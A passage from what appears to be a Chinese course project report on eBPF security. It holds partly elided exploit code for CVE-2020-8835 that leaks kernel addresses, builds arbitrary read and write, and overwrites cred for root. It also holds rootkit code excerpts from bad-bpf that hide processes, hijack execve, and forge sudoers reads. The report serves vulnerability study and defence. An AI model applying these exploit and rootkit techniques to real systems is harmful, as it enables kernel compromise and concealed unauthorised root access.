Part 1 用于处理输入参数并触发漏洞。首先读取 ctrl_map 的第一个 64 位值作为 r8，然后 r6 = r0 是参数地址，也就是 ctrl_buf 的实际存储空间，用来向攻击用户传回结果。接下来几个 JMP 设置了 r8 的 u{min,max}_value，并触发了漏洞，这样在和 0xffffffff 取或之后 r8 就变成了 verifier 完全确定的 0，但其值实际上是我们传入的 ctrl_buf 的首个 64 位值的低 32 位，我们设置其低 32 为 0x110，接下来就可以进入到 Part 2 中泄漏内核地址。

```c 
// Part 2 (leak info)
BPF_LD_MAP_FD(BPF_REG_9,exp_mapfd),             // r9 = exp_mapfd
BPF_MAP_GET_ADDR(0,BPF_REG_7),                  // r7 = &exp_buf[0]
BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_8),     // r7 = r7 - r8 = &exp_buf[0] - 0x110

BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),      // r0 = *(u64 *)(r7)
BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10),   // *(u64 *)(r6 + 0x10) = r0

BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0),   // r0 = *(u64 *)(r7 + 0xc0)
BPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50),          // r0 = r0 + 0x110 - 0xc0 = &exp_buf
```

Part 2 中首先取出 exp_map 的地址，然后减去 r8，这时 verifer 认为其减了 0 没有问题，但实际上已经减了 0x110 到了 bpf_map 的首地址，接下来取出首地址的值存回 ctrl_buf+0x10 即 `ctrl_buf[2]`，就可以在用户态读取，泄露出内核地址：

```c 
static void leak_info(uint64_t *buffer, int mapfd) {
    uint64_t key = 0;
    if (bpf_lookup_elem(&key, buffer, mapfd)) {
        __exit(strerror(errno));
    }
}

static void pwn(void) {
    ...
    execute_with_op(0);
    leak_info(ctrl_buf, ctrl_mapfd);
    uint64_t map_leak = ctrl_buf[2];
    printf("[+] leak array_map_ops:\t\t0x%lx\n", map_leak);
    kernel_base = map_leak - 0x1016480;
    printf("[+] leak kernel_base addr:\t0x%lx\n", kernel_base);
    ...
}

static void execute_with_op(uint32_t op) {
    ctrl_buf[0] = 0x2000000000 + 0x110;
    ctrl_buf[1] = op;
    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    bpf_update_elem(0, exp_buf, exp_mapfd, 0);
    execute();
}
```

在 Part 2 的末尾我们还需要得到 exp_buf 的地址用于后续 Part 4 的 map_ops 覆盖，在 `bpf_map` 的 0xc0 偏移处，有一个 wait_list 链表，其中第一个值就是一个指向自身的指针，所以我们可以通过读取这个值来得到 exp_buf 的地址：

```c
BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0),   // r0 = *(u64 *)(r7 + 0xc0)
BPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50),          // r0 = r0 + 0x110 - 0xc0 = &exp_buf
```

这里不直接从最开始的 r7 得到地址是因为 r7 的类型是指针，verifier 不允许写入指针，而经过如此操作读取出来的是标量值，可以后续写入到 map_ops 中。

接下来 eBPF 的 Part 3 用于进行任意地址读：

```c 
// Part 3 (arbitrary read)
BPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x8),    // r8 = *(u64 *)(r6 + 0x8) = op
BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 1, 4),          // if r8 != 1 goto +4
BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_6,0x20),   // r0 = *(u64 *)(r6 + 0x20) = addr
BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0x40),   // *(u64 *)(r7 + 0x40) = r0 (bpf_map->btf = addr-0x58)
BPF_MOV64_IMM(BPF_REG_0,0x0),                   // exit(0)
BPF_EXIT_INSN(),
```

先读取 `ctrl_buf[1]` 作为参数 op，如果是 1 表示读、2 表示写、0 表示不读也不写（比如泄漏地址的时候执行的就是 `update_elem(0)` 设置 op 为 0 不读也不写）。然后如果 op 是 1，就会执行下面的代码。

接下来读取了 r6+0x20，也就是 `ctrl_buf[4]`，我们令这个参数为 target-0x58，然后存入 r0 寄存器中，接下来存入 r7+0x40，r7 是 bpf_map 的开头，所以 0x40 偏移处就是 btf 指针的位置。接下来通过调用 `bpf_map_get_info_by_fd` 就可以触发任意地址读，读取出 target 处 32 位的值：

```c 
static uint32_t arbitrary_read32(uint64_t addr) {
    uint32_t read_info;

    ctrl_buf[0] = 0x2000000000 + 0x110;
    ctrl_buf[1] = 1;
    ctrl_buf[4] = addr - 0x58;

    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    bpf_update_elem(0, exp_buf, exp_mapfd, 0);
    execute();

    read_info = bpf_map_get_info_by_fd(0, exp_buf, exp_mapfd, info);
    return read_info;
}

static uint64_t arbitrary_read(uint64_t addr) {
    uint32_t addr_low = arbitrary_read32(addr);
    uint32_t addr_high = arbitrary_read32(addr + 0x4);
    return ((uint64_t)addr_high << 32) | addr_low;
}

static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)&key,
        .value = (__u64)value,
        .info.bpf_fd = mapfd,
        .info.info_len = 0x100,
        .info.info = (__u64)info,
    };
    syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
    return *(uint32_t *)((char *)info + 0x40);
}
```

接下来 Part 4 用于任意地址写前的准备：

```c 
// Part 4 (prepare for arbitrary write)
BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 2, 4),          // if r8 != 2 goto +4 (exit(0))
BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0),      // *(u64 *)(r7) = r0
BPF_ST_MEM(BPF_W,BPF_REG_7,0x18,BPF_MAP_TYPE_STACK),    // *(u32 *)(r7 + 0x18) = BPF_MAP_TYPE_STACK
BPF_ST_MEM(BPF_W,BPF_REG_7,0x24,-1),                    // *(u32 *)(r7 + 0x24) = -1 max_entries
BPF_ST_MEM(BPF_W,BPF_REG_7,0x2c,0x0),                   // *(u32 *)(r7 + 0x2c) = 0 lock_off

BPF_MOV64_IMM(BPF_REG_0,0x0),                   // exit(0)
BPF_EXIT_INSN(),
```

这里将 Part 2 里算出来的 exp_buf 地址写到 `bpf_map` 开头，也就是 map_ops 的位置，所以我们创建一个函数指针数组将其内容修改为我们劫持后的函数表，修改其中 `map_push_elem` 为 `map_get_next_key`，再把内容复制到 map 中，作为 r0 参数传递进来。然后修改 `bpf_map` 的 `map_type`、`max_entries`、`spin_lock_off` 即可。接下来通过调用 `bpf_update_elem` 就可以实现任意地址写：

```c 
static int bpf_update_elem(uint64_t key, void *value, int mapfd, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)&key,
        .value = (__u64)value,
        .flags = flags,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
```

`bpf_update_elem(0, exp_buf, exp_mapfd, addr)` 就可以实现 `*(u32 *)addr = exp_buf[0] + 1` 的任意地址写。

### 利用结果

利用任意地址读，我们可以读取到内核中的 `per_cpu_offset`，然后根据其偏移 0x17d00 得到 `current_task` 地址，再偏移 0x648 得到其中 `comm` 字段，即当前进程执行的命令，我们令其为 `0x353338385f707865` 即 `exp_8835`，我们后续也需要将 exp 编译后的可执行文件命名为此名称。查询到当前进程的 task 结构体后，就可以根据其偏移 0x638 得到 `cred` 结构体，即当前进程的权限信息：

```c 
uint64_t task_struct, cred, current_task, comm;
uint64_t per_cpu_offset = arbitrary_read(0xffffffff822c26c0);
printf("[+] per_cpu_offset:\t\t0x%lx\n", per_cpu_offset);
for (int i = 0; ; i++) {
    current_task = arbitrary_read(per_cpu_offset + 0x17d00);
    comm = arbitrary_read(current_task + 0x648);
    if (comm == 0x353338385f707865) {
        printf("[+] current_task:\t\t0x%lx\n", current_task);
        task_struct = current_task;
        break;
    }
    hextostr(comm);
}
hextostr(comm);

cred = arbitrary_read(task_struct + 0x638);
printf("[+] cred:\t0x%lx\n", cred);
```

接下来我们要利用任意地址写来覆盖 cred 结构体，先创建一个写满了 map_get_next_key 函数指针的数组，然后将其覆盖到 map_ops 中，再将 map 类型改为 stack 类型，这样就可以通过调用 map_push_elem 来调用 map_get_next_key，从而实现任意地址写：

```c
uint64_t fake_map_ops[] = {
    kernel_base + 0x16cfa0,
    ...
    kernel_base + 0x16cfa0,
};
memcpy(exp_buf, fake_map_ops, sizeof(fake_map_ops));
execute_with_op(2);
exp_buf[0] = 0x0-1;
for (int i = 0; i < 8; i++) {
    bpf_update_elem(0, exp_buf, exp_mapfd, cred + 4 + i * 4);
}
```

覆盖了 cred 权限为 0 后即可实现提权。我们基于 Linux-5.5 的内核，准备了一个建议 rootfs 文件系统，其中包含了我们编译好的 exp 代码，然后通过 qemu 启动内核，执行 exp，实现提权：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img5.png" width="100%" style="margin: 0 auto;">
</div>

## eBPF rootkit 安全威胁分析

### eBPF rootkit 原理

rootkit 是一种恶意软件，是单词 root 和 kit 的组合。root 是具有操作系统管理员身份的用户帐户。同时，kit 是指一套软件工具。因此，rootkit 是一组工具，可以为攻击者提供系统中的最高权限。 

rootkit 特别危险，因为它们旨在隐藏它们在设备上的存在。如果将 rootkit 安装到机器上（通常通过网络钓鱼），攻击者可以远程访问和控制受害机器。因为它们有 root 权限，rootkit 可用于执行诸如停用防病毒软件、监视活动、窃取敏感数据或在设备上执行其他恶意软件等高权限操作。

而 eBPF 就非常适合于制作 rootkit 程序，让我们回顾 eBPF 技术的特性：

- eBPF 技术允许在用户态编写代码，被 verifier 扫描鉴定无问题后，送入内核执行；
- eBPF 技术能够在不修改内核代码的前提下，查看内核数据或修改内核功能；
- eBPF 可以在 Linux 系统的各个地方插桩，在执行到指定位置时，执行用户自定的代码，实现数据的搜集和修改；
- 因此攻击者可以通过将 eBPF rootkit 加载到内核中来 hook 系统函数拦截和修改他们的行为，实现篡改内核数据结构、隐藏进程、文件或网络连接等目的。

此外，由于 eBPF rootkit 运行在内核态，传统的用户态防护措施很难检测到它的存在。同时，eBPF rootkit 可以动态加载和卸载，性能开销小，不需要修改内核代码或文件系统，增加了检测和防御的难度。

### bad-bpf 程序复现

bad-bpf 是 PatH 实现的一个 eBPF rootkit，并在 DEFCON '29 上进行了题为 *Warping Reality: Creating and Countering the Next Generation of Linux Rootkits* 的展示演讲。其实现了隐藏进程、劫持新建进程、用户提权等多种功能。

#### 隐藏进程

pidhide 程序通过 hook getdents64 系统调用来取消与 PID 相关联的 /proc/ 文件夹的链接，使 ps 无法查找到 /proc/ 文件夹中的进程信息。

```cpp 
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
    ···
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
    ···
}
```

将 linux_dirent64 结构体的 d_reclen 字段修改为 d_reclen_previous + d_reclen，使得读取目录时跳过隐藏的进程目录。

我们通过 docker 运行一个 /bin/bash 进程，可以通过 ps 看到这个进程：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img6.png" width="80%" style="margin: 0 auto;">
</div>

然后运行 pidhide 程序，加载恶意的 eBPF 程序，使得这个进程被隐藏，通过 ps 无法查看到：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img7.png" width="100%" style="margin: 0 auto;">
</div>

#### 劫持新建进程

exechijack 程序会劫持所有用于创建新进程的 execve 系统调用，转而调用 /a，即只输出 uid 和 argv[0]：

```cpp
SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx) {
    ···
    // 读取当前 execve 系统调用新建的进程信息
    bpf_probe_read_user(&prog_name, TASK_COMM_LEN, (void*)ctx->args[0]);
    bpf_probe_read_user(&prog_name_orig, TASK_COMM_LEN, (void*)ctx->args[0]);

    // 修改程序路径为 /a
    prog_name[0] = '/';
    prog_name[1] = 'a';
    for (int i = 2; i < TASK_COMM_LEN ; i++) {
        prog_name[i] = '\x00';
    }
    long ret = bpf_probe_write_user((void*)ctx->args[0], &prog_name, 3);
    ···
}
```

运行 exechijack 程序后，所有新进程都会被劫持转而运行 /a：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img8.png" width="90%" style="margin: 0 auto;">
</div>

#### 用户提权

sudo 命令在执行时会读取 `/etc/sudoers` 文件，查询其中的权限，查询当前执行命令的用户是否有 sudo 权限，是否需要密码等。我们可以拦截 sudo 对 `/etc/sudoers` 文件的读取，并用 `ALL=(ALL:ALL) NOPASSWD:ALL #` 覆盖第一行，使 sudo 认为该用户可以不需要密码执行 sudo 命令，从而实现用户提权。

```cpp
SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
    ···     // 写入用户名
    sprintf(skel->rodata->payload, "%s ALL=(ALL:ALL) NOPASSWD:ALL #", env.username); 
    skel->rodata->payload_len = strlen(skel->rodata->payload);
    ···     // 修改 /etc/sudoers 文件内容，并在修改内容后加上 # 注释
    char local_buff[max_payload_len] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) { local_buff[i] = '#'; }
        else { local_buff[i] = payload[i]; }
    }
    // 写入修改后的内容
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);
    ···
}
```

我们可以先尝试进行 `sudo ls`，可见低权限用户无法使用 sudo 命令：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img9.png" width="40%" style="margin: 0 auto;">
</div>

然后运行了 sudoadd 程序后，就可以执行 sudo 命令了：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img10.png" width="100%" style="margin: 0 auto;">
</div>

## 总结

通过以上对于 eBPF 内核漏洞以及 eBPF rootkit 的分析可以看出，eBPF 技术在为 Linux 内核引入了丰富可扩展的子系统功能的同时，也引入了很大的安全风险。eBPF 程序可以在内核态执行，可以访问内核数据结构，可以劫持系统调用，可以隐藏进程，可以劫持新建进程，可以提权等，这些功能都为攻击者提供了很大的空间。

通过对于 eBPF 现有的 CVE 漏洞进行分析，我们也得到了大部分漏洞出现于 verifier 上的结论，所以为了提高 verifier 安全性，我们要在增加 verifier 功能的同时，增加对于 verifier 代码的审计和 fuzz 测试，尽量减少 verifier 本身出现漏洞的可能。

同时对于 eBPF rootkit 的威胁，一方面可以增强对于 bpf 系统调用以及 eBPF 程序执行的更多权限检查，另一方面“解铃还需系铃人”，虽然 eBPF rootkit 难以通过已有手段探测，但是却可以通过 eBPF 程序来寻找 eBPF rootkit 存在的蛛丝马迹，也可以更广泛的探测其他 rootkit 的存在，实现内核的保护，但这就不是本文的重点了。

总结一下，本文首先介绍了 eBPF 技术的来源与发展，接下来介绍了 eBPF 技术的基本原理和安全设计，然后我们分析了几个 eBPF 中出现的严重提权 CVE 漏洞的原理，并详细分析了 CVE-2020-8835 漏洞的提权利用过程，再分析了其他 eBPF 历史 CVE 的漏洞位置分布。另一方面我们介绍了 eBPF rootkit 的原理，复现了 bad-bpf rootkit 包中的 pidhide、exechijack、sudoadd 功能，展示了 eBPF rootkit 的危害性，并总结了 eBPF 相关的安全发展。

## 参考文献及资料

<div class="reference" markdown="1">

1. MCCANNE S, JACOBSON V. The BSD packet filter: a new architecture for user-level packet capture[C]//Proceedings of the USENIX Winter 1993 Conference Proceedings on USENIX Winter 1993 Conference Proceedings. USA: USENIX Association, 1993: 2[2024-06-13].
1. MOHAMED M H N, WANG X, RAVINDRAN B. Understanding the Security of Linux eBPF Subsystem[C/OL]//Proceedings of the 14th ACM SIGOPS Asia-Pacific Workshop on Systems. New York, NY, USA: Association for Computing Machinery, 2023: 87-92[2024-06-14]. https://dl.acm.org/doi/10.1145/3609510.3609822.
1. CASSAGNES C, TRESTIOREANU L, JOLY C, 等. The rise of eBPF for non-intrusive performance monitoring[C/OL]//NOMS 2020 - 2020 IEEE/IFIP Network Operations and Management Symposium. 2020: 1-7[2024-05-08]. https://ieeexplore.ieee.org/document/9110434.
1. HEDAM N. eBPF - From a Programmer’s Perspective[C/OL]. 2021[2024-05-08]. https://www.semanticscholar.org/paper/eBPF-From-a-Programmer%E2%80%99s-Perspective-Hedam/fa841bd12df684991c5e0273bf7befd997131bd0.
1. SHARAF H, AHMAD I, DIMITRIOU T. Extended Berkeley Packet Filter: An Application Perspective[J/OL]. IEEE Access, 2022, 10: 126370-126393. https://doi.org/10.1109/ACCESS.2022.3226269.
1. NELSON L, GEFFEN J V, TORLAK E, 等. Specification and verification in the field: Applying formal methods to {BPF} just-in-time compilers in the Linux kernel[C/OL]//14th USENIX Symposium on Operating Systems Design and Implementation (OSDI 20). 2020: 41-61[2024-05-08]. https://www.usenix.org/conference/osdi20/presentation/nelson.
1. Introduction and practice of eBPF[EB/OL]. (2022-04-13)[2024-06-14]. https://www.sobyte.net/post/2022-04/ebpf/.
1. Dive into BPF: a list of reading material[EB/OL]. (2016-07-01)[2024-06-14]. https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/.
1. What is eBPF? An Introduction and Deep Dive into the eBPF Technology[EB/OL]. [2024-06-14]. https://ebpf.io/what-is-ebpf/.
1. NVD - CVE-2020-8835[EB/OL]. [2024-06-14]. https://nvd.nist.gov/vuln/detail/CVE-2020-8835.
1. Zero Day Initiative — CVE-2020-8835: Linux Kernel Privilege Escalation via Improper eBPF Program Verification[EB/OL]. [2024-06-14]. https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification.
1. CVE-2020-8835：eBPF verifier 整数截断导致越界读写 - bsauce[EB/OL]. [2024-06-15]. https://www.cnblogs.com/bsauce/p/14123111.html.  
1. BSAUCE. bsauce/kernel-exploit-factory[CP/OL]. (2024-06-14)[2024-06-15]. https://github.com/bsauce/kernel-exploit-factory.  
1. NVD - CVE-2020-27194[EB/OL]. [2024-06-14]. https://nvd.nist.gov/vuln/detail/CVE-2020-27194.
1. Fuzzing for eBPF JIT bugs in the Linux kernel[EB/OL]//Simon Scannell. (2020-11-01)[2024-06-14]. https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/.
1. CVE-2020-27194：Linux Kernel eBPF模块提权漏洞的分析与利用 - 360CERT[EB/OL]. [2024-06-14]. https://cert.360.cn/report/detail?id=534ffa63f950368b6741a1781173b242.
1. NVD - CVE-2021-3490[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2021-3490.
1. Kernel Pwning with eBPF - a Love Story - chompie at the bits[EB/OL]. [2024-06-15]. https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story.
1. CHOMPIE. chompie1337/Linux_LPE_eBPF_CVE-2021-3490[CP/OL]. (2024-06-07)[2024-06-15]. https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490.
1. CVE-2021-3490 eBPF 32位边界计算错误漏洞利用分析-安全客[EB/OL]. [2024-06-15]. https://www.anquanke.com/post/id/251933.
1. NVD - CVE-2022-23222[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2022-23222.
1. oss-security - Re: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. https://www.openwall.com/lists/oss-security/2022/01/18/2.
1. TR3E. cve-2022-23222-linux-kernel-ebpf-lpe[EB/OL]. [2024-06-15]. https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt.
1. TR3E. tr3ee/CVE-2022-23222[CP/OL]. (2024-05-15)[2024-06-15]. https://github.com/tr3ee/CVE-2022-23222.
1. MEANWHILE. Linux内核eBPF权限提升漏洞复现(CVE-2022-23222)[EB/OL]//星期五实验室. [2024-06-15]. https://mp.weixin.qq.com/s/QJz9so27ao4rmT1Sbp74KA
1. NVD - CVE-2021-4204[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/detail/CVE-2021-4204.
1. oss-security - Re: CVE-2021-4204: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. https://www.openwall.com/lists/oss-security/2022/01/18/1.
1. TR3E. tr3ee/CVE-2021-4204[CP/OL]. (2024-02-23)[2024-06-15]. https://github.com/tr3ee/CVE-2021-4204.
1. NVD - eBPF Search Results[EB/OL]. [2024-06-15]. https://nvd.nist.gov/vuln/search/results?isCpeNameSearch=false&query=eBPF&results_type=overview&form_type=Basic&search_type=all&startIndex=0.
1. JIA J, ZHU Y, WILLIAMS D, 等. Programmable System Call Security with eBPF[M/OL]. arXiv, 2023[2024-06-15]. http://arxiv.org/abs/2302.10366.
1. DEJAEGHERE J, GBADAMOSI B, PULLS T, 等. Comparing Security in eBPF and WebAssembly[C/OL]//Proceedings of the 1st Workshop on eBPF and Kernel Extensions. New York, NY, USA: Association for Computing Machinery, 2023: 35-41[2024-06-14]. https://dl.acm.org/doi/10.1145/3609021.3609306.
1. Linux中基于eBPF的恶意利用与检测机制 - 美团技术团队[EB/OL]. [2024-05-08]. https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html.
1. FOURNIER G, BAUBEAU S. With Friends like eBPF, who needs enemies ?[J/OL]. (2021)[2024-05-08]. https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-With-Friends-Like-EBPF-Who-Needs-Enemies.pdf
1. PAT_H/TO/FILE. pathtofile/bad-bpf[CP/OL]. (2024-06-03)[2024-06-16]. https://github.com/pathtofile/bad-bpf.
1. TREMB1E. ebpf-rootkit-and-detection[EB/OL]//Tremb1e’s Blog. (2022-04-17)[2024-06-16]. https://www.tremb1e.com/archives/ebpf-rootkit-and-detection.  
1. DEF CON 29 - PatH - Warping Reality: Creating and Countering the Next Generation of Linux Rootkits - YouTube[EB/OL]. [2024-06-16]. https://www.youtube.com/watch?v=g6SKWT7sROQ.  
1. DEF CON 29: Bad BPF - Warping reality using eBPF[EB/OL]//pat_h/to/file. (2021-08-01)[2024-06-16]. https://blog.tofile.dev/2021/08/01/bad-bpf.html.


</div>
